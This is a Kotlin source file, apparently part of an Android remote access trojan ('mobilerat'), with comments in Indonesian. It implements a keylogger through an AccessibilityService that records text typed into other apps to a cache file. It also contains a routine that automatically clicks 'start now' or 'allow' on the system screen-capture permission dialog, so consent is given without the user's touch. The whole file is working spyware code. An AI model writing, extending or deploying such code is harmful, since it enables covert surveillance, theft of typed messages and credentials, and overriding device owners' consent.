package com.kai.mobilerat

import android.accessibilityservice.AccessibilityService
import android.content.ComponentName
import android.content.Context
import android.graphics.Rect
import android.os.SystemClock
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Keylogger lewat AccessibilityService. Ini satu-satunya jalur resmi di
 * Android untuk membaca ketikan aplikasi lain; tanpa root, tanpa Xposed, dan
 * tanpa hook native — OS sendiri yang mengirim event teks ke sini.
 *
 * Batasnya nyata dan harus diketahui:
 *  - pemilik perangkat harus mengaktifkannya di Settings > Accessibility
 *  - hanya kolom teks yang diekspos aplikasi (password field biasanya
 *    menandai dirinya `password` dan isinya tidak dikirim)
 *  - satu event = isi kolom penuh, bukan satu tombol; karena itu yang dicatat
 *    hanya selisihnya terhadap isi terakhir per aplikasi
 */
class KeylogService : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        enabled = true
        instance = this
    }

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        instance = null
        return super.onUnbind(intent)
    }

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }

    /**
     * Klik sendiri tombol positif di dialog izin MediaProjection.
     *
     * Android tidak punya cara memberi izin layar tanpa dialog sejak API 21 —
     * `MediaProjectionManager` selalu memunculkan `MediaProjectionPermissionActivity`
     * milik SystemUI. Yang bisa diotomatiskan cuma siapa yang menekan tombolnya:
     * AccessibilityService punya hak untuk mencari node dan mengkliknya, jadi
     * dialog itu ditutup sendiri oleh aplikasi, tanpa sentuhan operator.
     *
     * Dialog `MediaProjectionPermissionActivity` adalah `AlertActivity`, jadi
     * tombol positifnya selalu ber-id `android:id/button1`. Kalau id itu tidak
     * ketemu (mis. ROM yang mengganti layoutnya), dicari lewat teks.
     *
     * @return true kalau ada tombol yang berhasil diklik.
     */
    fun autoConsent(timeoutMs: Long = 15_000L): Boolean {
        val deadline = SystemClock.elapsedRealtime() + timeoutMs
        while (SystemClock.elapsedRealtime() < deadline) {
            val target = findConsentButton()
            if (target != null) {
                if (target.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
                val r = Rect()
                target.getBoundsInScreen(r)
                if (!r.isEmpty && tap(r.centerX(), r.centerY())) return true
            }
            try {
                Thread.sleep(200)
            } catch (_: InterruptedException) {
                return false
            }
        }
        return false
    }

    private fun findConsentButton(): AccessibilityNodeInfo? {
        val roots = ArrayList<AccessibilityNodeInfo>()
        try {
            for (w in windows) {
                val r = try {
                    w.root
                } catch (_: Exception) {
                    null
                } ?: continue
                if (r.packageName?.toString() != "com.android.systemui") continue
                roots.add(r)
            }
        } catch (_: Exception) {
        }
        if (roots.isEmpty()) {
            try {
                rootInActiveWindow?.let { roots.add(it) }
            } catch (_: Exception) {
            }
        }

        for (root in roots) {
            try {
                root.findAccessibilityNodeInfosByViewId("android:id/button1")
                    .firstOrNull()?.let { return it }
            } catch (_: Exception) {
            }
            for (label in CONSENT_LABELS) {
                try {
                    root.findAccessibilityNodeInfosByText(label)
                        .firstOrNull { it.isClickable || it.parent?.isClickable == true }
                        ?.let { return it }
                } catch (_: Exception) {
                }
            }
        }
        return null
    }

    private fun tap(x: Int, y: Int): Boolean = try {
        val path = android.graphics.Path()
        path.moveTo(x.toFloat(), y.toFloat())
        dispatchGesture(
            android.accessibilityservice.GestureDescription.Builder()
                .addStroke(
                    android.accessibilityservice.GestureDescription.StrokeDescription(
                        path, 0, 60
                    )
                )
                .build(),
            null, null
        )
    } catch (_: Exception) {
        false
    }

    override fun onInterrupt() {
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!enabled || event == null) return
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return

        val text = buildString {
            for (i in 0 until event.text.size) append(event.text[i] ?: "")
        }
        if (text.isEmpty()) return

        val delta = synchronized(last) {
            val prev = last[pkg] ?: ""
            last[pkg] = text
            when {
                text == prev -> ""
                text.startsWith(prev) -> text.substring(prev.length)
                else -> " [$text]"
            }
        }
        if (delta.isEmpty()) return
        append(this, "$pkg: $delta")
    }

    companion object {

        private const val MAX = 200_000

        /**
         * Label tombol positif dialog izin layar. Diambil dari teks karena
         * `android:id/button1` tidak selalu ada di build SystemUI yang dimodifikasi;
         * pencocokan `findAccessibilityNodeInfosByText` tidak peka huruf besar.
         */
        private val CONSENT_LABELS = arrayOf(
            "start now", "mulai sekarang", "mulai", "izinkan", "allow"
        )

        /** Instance hidup, dipakai `Screen` untuk mengklik dialognya sendiri. */
        @Volatile
        var instance: KeylogService? = null

        @Volatile
        var enabled = true

        private val last = HashMap<String, String>()

        fun file(ctx: Context): File = File(ctx.cacheDir, "keylog.txt")

        fun append(ctx: Context, line: String) {
            try {
                val f = file(ctx)
                if (f.length() > MAX) f.delete()
                val ts = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                f.appendText("$ts $line\n")
            } catch (_: Exception) {
            }
        }

        fun clear(ctx: Context) {
            try {
                file(ctx).delete()
            } catch (_: Exception) {
            }
            synchronized(last) { last.clear() }
        }

        /** Apakah service ini sudah diaktifkan pemilik perangkat di Settings. */
        fun isEnabled(ctx: Context): Boolean {
            val flat = ComponentName(ctx, KeylogService::class.java).flattenToString()
            val short = ComponentName(ctx, KeylogService::class.java).flattenToShortString()
            val list = try {
                Settings.Secure.getString(
                    ctx.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                )
            } catch (_: Exception) {
                null
            } ?: return false
            return list.split(':').any { it.equals(flat, true) || it.equals(short, true) }
        }
    }
}
